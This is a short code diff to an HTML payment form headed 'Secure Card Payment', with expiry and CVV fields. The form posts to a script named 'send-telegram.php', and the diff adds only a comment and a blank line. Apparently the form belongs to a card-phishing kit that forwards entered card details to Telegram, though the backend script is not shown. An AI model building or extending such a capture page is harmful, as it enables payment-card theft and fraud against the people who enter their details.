@@ -84,6 +84,7 @@
 <body>
 
   <!-- The Payment Form -->
+  <!-- 💡 NOTICE: Action links directly to the backend PHP file -->
   <form class="payment-form" action="send-telegram.php" method="POST">
     <h2>Secure Card Payment</h2>
     
@@ -102,6 +103,7 @@
     <!-- Expiry and CVV Row -->
     <div class="form-row">
       <div class="form-group">
+        
         <label for="expiry">Expiry Date</label>
         <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
       </div>
